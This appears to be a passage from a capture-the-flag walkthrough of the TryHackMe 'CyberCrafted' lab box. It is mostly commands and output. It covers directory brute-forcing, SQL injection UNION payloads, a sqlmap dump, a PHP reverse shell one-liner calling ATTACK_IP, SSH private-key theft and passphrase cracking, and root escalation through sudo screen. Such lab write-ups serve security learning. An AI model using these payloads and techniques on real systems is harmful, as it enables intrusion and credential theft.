200,301,302 -x php===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://admin.cybercrafted.thm/[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt[+] Status codes: 200,301,302[+] User Agent: gobuster/3.0.1[+] Extensions: php[+] Timeout: 10s===============================================================2021/11/21 04:14:11 Starting gobuster===============================================================/index.php (Status: 200)/login.php (Status: 302)/assets (Status: 301)/. (Status: 200)/panel.php (Status: 302)===============================================================2021/11/21 04:14:20 Finished===============================================================All of the 300 codes redirect to /index.php which is the login page. Perhaps this where the vulnerability lies.Running through some very common default credentials (admin:admin, admin:password, admin:password123, root:root, root:password) doesn’t provide any give.Next trying some XSS payloads, and some potential SQL Injection doesn’t show promise either. We’ll look at the next domain:gobuster dir -u http://store.cybercrafted.thm/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -s 200,301,302 -x php===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://store.cybercrafted.thm/[+] Threads: 10[+] Wordlist: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt[+] Status codes: 200,301,302[+] User Agent: gobuster/3.0.1[+] Extensions: php[+] Timeout: 10s===============================================================2021/11/21 04:27:45 Starting gobuster===============================================================/xxxxxx.php (Status: 200)/assets (Status: 301)===============================================================2021/11/21 04:27:55 Finished===============================================================It look like we have another input field to mess with.We’ll run throught the other steps with this domain as well.We get some results the search &#39; OR 1=1-- - is used. This appears to be SQL injectable On what page did you find the vulnerability?ExploitationSQLiIf you haven’t already, I would recommend checking out PortSwiggers Web Academy on SQL Injection. We’ll try a UNION attack on the database. For a UNION query to work, two key requirements must be met: The individual queries must return the same number of columns.The data types in each column must be compatible between the individual queries.To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out: How many columns are being returned from the original query?Which columns returned from the original query are of a suitable data type to hold the results from the injected query?Since error messages don’t appear to be returned to the webpage with a broken SQL query, we’ll use NULLs to to find the number of columns. Starting off with &#39; UNION SELECT NULL-- - shows nothing in the results. That’s okay. We’ll keep adding NULLs until we get a successful return. With the query &#39; UNION SELECT NULL,NULL,NULL,NULL-- - we see some results. Now we now there are four columns.Now to get the available tables, we can use the query &#39; UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables-- -The admin table at the bottom looks promising. Next we’ll see what fields the admin table has with &#39; UNION SELECT NULL,NULL,NULL,column_name FROM information_schema.columns WHERE table_name=&#39;admin&#39;-- -The admin table has an id, user, and hash field. To view the values from the fields, we’ll finish of this injection with &#39; UNION SELECT NULL,NULL,user,hash FROM admin-- -Now if you wanted a script to take care of figuring this all out for you, you could have used sqlmapsqlmap -u &quot;store.cybercrafted.thm/xxxxxx.php&quot; --method POST --data &quot;search=doesnt&amp;amp;submit=matter&quot; -p search --batch --dump ___ __H__ ___ ___[)]_____ ___ ___ {1.2.4#stable}|_ -| . [)] | .&#39;| . ||___|_ [&#39;]_|_|_|__,| _| |_|V |_| http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 05:18:28[05:18:28] [INFO] testing connection to the target URL[05:18:28] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS[05:18:28] [INFO] testing if the target URL content is stable[05:18:29] [INFO] target URL content is stable[05:18:29] [WARNING] heuristic (basic) test shows that POST parameter &#39;search&#39; might not be injectable[05:18:29] [INFO] testing for SQL injection on POST parameter &#39;search&#39;[05:18:29] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;[05:18:29] [INFO] testing &#39;MySQL &amp;gt;= 5.0 boolean-based blind - Parameter replace&#39;[05:18:29] [INFO] testing &#39;MySQL &amp;gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;[05:18:29] [INFO] testing &#39;PostgreSQL AND error-based - WHERE or HAVING clause&#39;[05:18:29] [INFO] testing &#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#39;[05:18:30] [INFO] testing &#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#39;[05:18:30] [INFO] testing &#39;MySQL &amp;gt;= 5.0 error-based - Parameter replace (FLOOR)&#39;[05:18:30] [INFO] testing &#39;MySQL inline queries&#39;[05:18:30] [INFO] testing &#39;PostgreSQL inline queries&#39;[05:18:30] [INFO] testing &#39;Microsoft SQL Server/Sybase inline queries&#39;[05:18:30] [INFO] testing &#39;PostgreSQL &amp;gt; 8.1 stacked queries (comment)&#39;[05:18:30] [INFO] testing &#39;Microsoft SQL Server/Sybase stacked queries (comment)&#39;[05:18:30] [INFO] testing &#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#39;[05:18:30] [INFO] testing &#39;MySQL &amp;gt;= 5.0.12 AND time-based blind&#39;[05:18:30] [INFO] testing &#39;PostgreSQL &amp;gt; 8.1 AND time-based blind&#39;[05:18:30] [INFO] testing &#39;Microsoft SQL Server/Sybase time-based blind (IF)&#39;[05:18:30] [INFO] testing &#39;Oracle AND time-based blind&#39;[05:18:30] [INFO] testing &#39;Generic UNION query (NULL) - 1 to 10 columns&#39;[05:18:30] [INFO] &#39;ORDER BY&#39; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[05:18:30] [INFO] target URL appears to have 4 columns in query[05:18:30] [WARNING] applying generic concatenation (CONCAT)[05:18:30] [INFO] POST parameter &#39;search&#39; is &#39;Generic UNION query (NULL) - 1 to 10 columns&#39; injectable[05:18:30] [INFO] checking if the injection point on POST parameter &#39;search&#39; is a false positivePOST parameter &#39;search&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] Nsqlmap identified the following injection point(s) with a total of 108 HTTP(s) requests:---Parameter: search (POST) Type: UNION query Title: Generic UNION query (NULL) - 4 columns Payload: search=doesnt&#39; UNION ALL SELECT NULL,NULL,NULL,CONCAT(CONCAT(&#39;qqbpq&#39;,&#39;tCMDIXovbmVxcjxBkbxvhDNNverteIdImoAtEJRH&#39;),&#39;qqbqq&#39;)-- YnFh&amp;amp;submit=matter---[05:18:30] [INFO] testing MySQL[05:18:30] [INFO] confirming MySQL[05:18:30] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntuweb application technology: Apache 2.4.29back-end DBMS: MySQL &amp;gt;= 5.0.0[05:18:30] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries[05:18:30] [INFO] fetching current database[05:18:30] [INFO] fetching tables for database: &#39;webapp&#39;[05:18:30] [INFO] fetching columns for table &#39;admin&#39; in database &#39;webapp&#39;[05:18:30] [INFO] fetching entries for table &#39;admin&#39; in database &#39;webapp&#39;[05:18:30] [INFO] recognized possible password hashes in column &#39;hash&#39;do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] Ndo you want to crack them via a dictionary-based attack? [Y/n/q] Y[05:18:30] [INFO] using hash method &#39;sha1_generic_passwd&#39;what dictionary do you want to use?[1] default dictionary file &#39;/usr/share/sqlmap/txt/wordlist.zip&#39; (press Enter)[2] custom dictionary file[3] file with list of dictionary files&amp;gt; 1[05:18:30] [INFO] using default dictionarydo you want to use common password suffixes? (slow!) [y/N] N[05:18:30] [INFO] starting dictionary-based cracking (sha1_generic_passwd)[05:18:30] [INFO] starting 2 processes [05:18:39] [WARNING] no clear password(s) found Database: webappTable: admin[2 entries]+----+------------------------------------------+---------------------+| id | hash | user |+----+------------------------------------------+---------------------+| 1 | 8xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx1 | xXUxxxxxxxxxxxxxxxx || 4 | THM{bxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx8} | web_flag |+----+------------------------------------------+---------------------+ What is the admin’s username? What is the the web flag?Code ExecutionThere are a few ways to go about using the hash we see here. I prefer to just run the hash against a rainbow table for some low hanging fruit. Should that not work, there’s always JohnTheRipper or HashCat. Going to CrackStation, I pop the hash in the field, click submit, and get a hitNow that we have credentials, we can try to login to the admin panel at admin.cybercrafted.thm.We have a successful login with an interesting pageTyping in id returns uid=33(www-data) gid=33(www-data) groups=33(www-data). So this returns any system command from the host machine. With this page being ran by php, I’m going to play it safe and try setting up a php reverse shell. First I’ll setup a netcat listener in my terminal~# nc -lvnp 8080Listening on [0.0.0.0] (family 0, port 8080)Then I’ll modify the php reverse shell script I snagged off of pentestmonkeyphp -r &#39;$sock=fsockopen(&quot;ATTACK_IP&quot;,8080);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);&#39;and paste into the panel.php page and click enter. Going back to the terminal, there is a successful connection!~# nc -lvnp 8080Listening on [0.0.0.0] (family 0, port 8080)Connection from 10.10.155.126 54646 received!/bin/sh: 0: can&#39;t access tty; job control turned off$ whoamiwww-data$ uname -aLinux cybercrafted 4.15.0-159-generic #167-Ubuntu SMP Tue Sep 21 08:55:05 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux$ hostnamecybercraftedSince this box has python3, I’ll setup a more stable shell with python. You can follow this guide to do the same. Just remember to use python3 instead of python when running the commands.Lateral MovementI tend to view which users are on a machine when I first get onto a box. Checking out /home I find there are two users.www-data@cybercrafted:/var/www/admin$ ls -al /hometotal 16drwxr-xr-x 4 root root 4096 Jun 27 17:50 .drwxr-xr-x 24 root root 4096 Sep 30 13:14 ..drwxr-x--- 4 cybercrafted cybercrafted 4096 Sep 12 10:33 cybercrafteddrwxr-xr-x 5 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Oct 15 20:43 xxxxxxxxxxxxxxxxxxxWhat’s interesting here is the permission on the users folder. Even though this folder is owned by the admin, the permissions show that anyone can navigate into the admins home folder. So we’ll do just that.www-data@cybercrafted:/home/xxxxxxxxxxxxxxxxxxx$ ls -altotal 32drwxr-xr-x 5 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Oct 15 20:43 .drwxr-xr-x 4 root root 4096 Jun 27 17:50 ..lrwxrwxrwx 1 root root 9 Sep 12 10:38 .bash_history -&amp;gt; /dev/null-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 220 Jun 27 09:19 .bash_logout-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 3771 Jun 27 09:19 .bashrcdrwx------ 2 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:38 .cachedrwx------ 3 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:38 .gnupg-rw-rw-r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 0 Jun 27 17:40 .hushlogin-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 807 Jun 27 09:19 .profiledrwxrwxr-x 2 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:35 .sshlrwxrwxrwx 1 root root 9 Oct 15 20:43 .viminfo -&amp;gt; /dev/nullThe SSH folder is also open to us. Let’s keep this going…www-data@cybercrafted:/home/xxxxxxxxxxxxxxxxxxx/.ssh$ ls -altotal 16drwxrwxr-x 2 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Jun 27 09:35 .drwxr-xr-x 5 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 4096 Oct 15 20:43 ..-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 414 Jun 27 09:33 authorized_keys-rw-r--r-- 1 xxxxxxxxxxxxxxxxxxx xxxxxxxxxxxxxxxxxxx 1766 Jun 27 09:33 id_rsaI see a private key (id_rsa) that is viewable to anyone. I’m going to copy the contents of the file and paste them into a file on my machine and use that private key to attempt to login as this user.First we need to cat out the filewww-data@cybercrafted:/home/xxxxxxxxxxxxxxxxxxx/.ssh$ cat id_rsa-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,3579498908433674083EAAD00F2D89F6Sc3FPbCv/4DIpQUOalsczNkVCR+hBdoiAEM8mtbF2RxgoiV7XF2PgEehwJUhhyDG+Bb/uSiC1AsL+UO8WgDsbSsBwKLWijmYCmsp1fWp3xaGX2qVVbmI45ch8ef3QQ1U---[snip]---Then copy and paste the contents into a file on our own box. Don’t forget to change the permissions of the file after you save it: chmod 400 admin_rsaWith the private key, we can now attempt to login as the admin:root@ip-10-10-168-165:~# ssh -i admin_rsa xxxxxxxxxxxxxxxxxxx@10.10.155.126The authenticity of host &#39;10.10.155.126 (10.10.155.126)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:okt+zU5MJ0D6EUFqOILqeZ9l1c9p53AxM90JQpBvfvg.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &#39;10.10.155.126&#39; (ECDSA) to the list of known hosts.Enter passphrase for key &#39;admin_rsa&#39;: It appears the private key has passphrase. No worries, ssh2john.py can pull the hash off of the key for us. Once we have the hash, JohnTheRipper can be used to decypt the hash file.root@ip-10-10-168-165:~# /opt/john/ssh2john.py admin_rsa &amp;gt; admin_rsa.hashroot@ip-10-10-168-165:~# john --wordlist=/usr/share/wordlists/rockyou.txt admin_rsa.hashNote: This format may emit false positives, so it will keep trying even after finding apossible candidate.Warning: detected hash type &quot;SSH&quot;, but the string is also recognized as &quot;ssh-opencl&quot;Use the &quot;--format=ssh-opencl&quot; option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 2 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusxxxxxxxxxxx (admin_rsa)1g 0:00:00:16 DONE (2021-11-21 06:20) 0.05906g/s 847117p/s 847117c/s 847117C/s *7¡Vamos!Session completed.With the passphrase now in hand, we can try to ssh once again:root@ip-10-10-168-165:~# ssh -i admin_rsa xxxxxxxxxxxxxxxxxxx@10.10.155.126Enter passphrase for key &#39;admin_rsa&#39;: xxxxxxxxxxxxxxxxxxx@cybercrafted:~$ And we’re in!First things first, we need to learn more about this user. We should see what groups they are associate with. To do this, we can use cat /etc/group to view all groups and see who’s associated with each one, or we can just use the command groupsxxxxxxxxxxxxxxxxxxx@cybercrafted:~$ groupsxxxxxxxxxxxxxxxxxxx minecraftIt appears our user is a part of the minecraft group. Next we should see what files this group can view.xxxxxxxxxxxxxxxxxxx@cybercrafted:~$ find / -type f -group minecraft 2&amp;gt;/dev/null/opt/minecraft/note.txt/opt/minecraft/minecraft_server_flag.txt/opt/minecraft/cybercrafted/help.yml/opt/minecraft/cybercrafted/commands.yml/opt/minecraft/cybercrafted/world/level.dat_mcr/opt/minecraft/cybercrafted/world/session.lock/opt/minecraft/cybercrafted/world/DIM-1/data/villages.dat/opt/minecraft/cybercrafted/world/DIM-1/forcedchunks.dat--[snip]--This command says to find starting at root (/) all files (-type f) with group minecraft and send all errors to the abyss (/dev/null).And near the top, we see minecraft_server_flag.txt Can you get the Mincraft server flag?In the /opt/minecraft directory, there is also a note which reads:Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)- cybercraftedP.SWill remove the whitelist soon.This leads into the next question. We navigated into the cybercrafted directory and list out the contents, there is a plugins directoryxxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted$ ls -altotal 19568drwxr-x--- 7 cybercrafted minecraft 4096 Jun 27 16:53 .drwxr-x--- 4 cybercrafted minecraft 4096 Jun 27 17:24 ..-rwxr-x--- 1 cybercrafted minecraft 109 Nov 21 14:25 banned-ips.txt-rwxr-x--- 1 cybercrafted minecraft 109 Nov 21 14:25 banned-players.txt-rwxr-x--- 1 cybercrafted minecraft 1491 Nov 21 14:25 bukkit.yml-rwxr-x--- 1 cybercrafted minecraft 623 Nov 21 14:25 commands.yml-rwxr-x--- 1 cybercrafted minecraft 19972709 Jun 27 08:21 craftbukkit-1.7.2-server.jar-rwxr-x--- 1 cybercrafted minecraft 2576 Jun 27 08:22 help.ymldrwxr-x--- 2 cybercrafted minecraft 4096 Nov 21 14:25 logs-rwxr-x--- 1 cybercrafted minecraft 0 Nov 21 14:25 ops.txt-rwxr-x--- 1 cybercrafted minecraft 0 Jun 27 08:22 permissions.ymldrwxr-x--- 3 cybercrafted minecraft 4096 Jun 27 08:25 plugins-rwxr-x--- 1 cybercrafted minecraft 6441 Jun 27 09:08 server-icon.png-rwxr-x--- 1 cybercrafted minecraft 813 Nov 21 14:25 server.properties-rwxr-x--- 1 cybercrafted minecraft 0 Jun 27 08:22 white-list.txtdrwxr-x--- 9 cybercrafted minecraft 4096 Nov 21 14:50 worlddrwxr-x--- 5 cybercrafted minecraft 4096 Jun 27 08:51 world_netherdrwxr-x--- 5 cybercrafted minecraft 4096 Nov 21 14:50 world_the_endWithin plugins, there is only one directory and that directory contains some interesting files.xxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$ ls -altotal 24drwxr-x--- 2 cybercrafted minecraft 4096 Oct 6 09:59 .drwxr-x--- 3 cybercrafted minecraft 4096 Jun 27 08:25 ..-rwxr-x--- 1 cybercrafted minecraft 667 Nov 21 14:25 language.yml-rwxr-x--- 1 cybercrafted minecraft 943 Nov 21 14:25 log.txt-rwxr-x--- 1 cybercrafted minecraft 90 Jun 27 13:32 passwords.yml-rwxr-x--- 1 cybercrafted minecraft 25 Nov 21 14:25 settings.yml What is the name of the sketchy plugin?Naturally we would gravitate towards passwords.yml. The password hashes in this yaml file do not provide any use to us. We could attempt to run hashcat or john against these MD5 hashes, but we would only be able to decrypt the madrinch user and not the cybercrafted user. There are only three other files in this directory and I’m thinking logs.txt or possibly settings.yml might have some useful info.xxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$ cat log.txt[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/06/27 11:25:16] cybercrafted registered. PW: xxxxxxxxxxxxxxxxxxx[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/06/27 11:47:34] cybercrafted logged in. PW: xxxxxxxxxxxxxxxxxxx[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/06/27 11:57:29] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/06/27 11:57:54] cybercrafted logged in. PW: xxxxxxxxxxxxxxxxxxx[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/06/27 11:58:46] cybercrafted logged in. PW: xxxxxxxxxxxxxxxxxxx[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/06/27 11:59:01] madrinch logged in. PW: Password123[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/10/15 20:36:21] [BUKKIT-SERVER] Startet xxxxxxxxxxx![2021/10/15 21:00:43] [BUKKIT-SERVER] Startet xxxxxxxxxxx!That spells it out easy enough for us. With the cybercrafted users password in hand, we can try to switch user (su)xxxxxxxxxxxxxxxxxxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$ su cybercraftedPassword: cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/xxxxxxxxxxx$Privilege EscalationKnowing what permissions a user is allowed to do, sudo is a pretty important one. We can view what sudo privileges the user can perform by typing sudo -lcybercrafted@cybercrafted:~$ sudo -l[sudo] password for cybercrafted: Matching Defaults entries for cybercrafted on cybercrafted: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser cybercrafted may run the following commands on cybercrafted: (root) /usr/bin/screen -r cybercraftedThis user is allowed to run the command /usr/bin/screen -r cybercrafted with sudo. Screen is a windows manager for terminals much like tmux. So if we can use sudo to launch screen, we should be able to spawn terminals from screen which should inherit root privileges.Searching online we can find what commands to use to spawn shells from screen or we can use the linux manual to dig through the commands (man screen). When we run the command, we are reattaching to an existing session (-r cybercrafted) and from there all we have to is spawn new window with a shell (ctl+a c).# whoamiroot# iduid=0(root) gid=1002(cybercrafted) groups=1002(cybercrafted)# ls -al /roottotal 52drwx------ 6 root root 4096 Oct 15 20:46 .drwxr-xr-x 24 root root 4096 Sep 30 13:14 ..lrwxrwxrwx 1 root root 9 Sep 12 09:33 .bash_history -&amp;gt; /dev/null-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwx------ 2 root root 4096 Jun 27 17:49 .cachedrwx------ 3 root root 4096 Jun 27 17:49 .gnupgdrwxr-xr-x 3 root root 4096 Oct 4 16:08 .local-rw------- 1 root root 664 Sep 12 10:27 .mysql_history-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r----- 1 root root 38 Jun 27 17:30 root.txtdrwx------ 2 root root 4096 Jun 27 17:45 .ssh-rw------- 1 root root 10959 Oct 15 20:46 .viminfo Finish the job and give me the root flag!" } ]
